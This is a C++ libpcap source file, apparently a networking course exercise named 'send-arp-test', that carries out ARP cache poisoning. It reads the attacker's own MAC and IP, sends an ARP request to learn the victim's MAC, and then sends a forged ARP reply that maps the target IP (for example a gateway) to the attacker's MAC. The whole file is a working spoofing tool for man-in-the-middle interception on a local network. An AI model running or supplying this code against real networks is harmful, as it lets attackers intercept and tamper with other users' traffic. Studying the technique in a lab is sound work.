#include <cstdio>
#include <stdbool.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void getAttackAddress(const char *iface, unsigned char *mac, char *ip) {
    int fd;
    struct ifreq ifr;

    // Open socket
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(1);
    }

    // Get MAC address
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl - SIOCGIFHWADDR");
        close(fd);
        exit(1);
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    // Get IP address
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl - SIOCGIFADDR");
        close(fd);
        exit(1);
    }
    strncpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), INET_ADDRSTRLEN);

    // Close socket
    close(fd);
}

int main(int argc, char* argv[]) {
    if (argc <= 3 || argc % 2 != 0) {
		usage();
		return -1;
	}
    for(int i = 2; i < argc-1; i+=2) {
        char* dev = argv[1];
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
        }

        EthArpPacket packet;

        unsigned char my_mac[6];
        char attack_ip[INET_ADDRSTRLEN];
        getAttackAddress(dev, my_mac, attack_ip);

        char attack_mac[18];
        snprintf(attack_mac, sizeof(attack_mac), "%02x:%02x:%02x:%02x:%02x:%02x", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
        printf("%s\n", attack_ip);
        printf("%s\n", attack_mac);

        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(attack_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(attack_mac);
        packet.arp_.sip_ = htonl(Ip(attack_ip));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(argv[i]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        struct pcap_pkthdr *header;
        const u_char *pkt_data;
        Mac sender_mac;

        res = pcap_next_ex(handle, &header, &pkt_data);
        if (res == 0) {
            fprintf(stderr, "Timeout occurred, no packets available return %d error=%s\n", res, pcap_geterr(handle));
        }

        EthArpPacket *eth_arp_packet = (EthArpPacket*)pkt_data;

        ArpHdr arp_header = eth_arp_packet->arp_;
        if (arp_header.op() == ArpHdr::Reply) {
            sender_mac = arp_header.smac();
        }

        // ARP Spoofing
        printf("%s\n", std::string(sender_mac).c_str());
        packet.eth_.dmac_ = Mac(std::string(sender_mac).c_str());
        packet.eth_.smac_ = Mac(attack_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(attack_mac);
        packet.arp_.sip_ = htonl(Ip(argv[i+1]));
        packet.arp_.tmac_ = Mac(std::string(sender_mac).c_str());
        packet.arp_.tip_ = htonl(Ip(argv[i]));

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        if (res == -1) {
            fprintf(stderr, "Error occurred while capturing packets: %s\n", pcap_geterr(handle));
        }

        pcap_close(handle);
    }

}
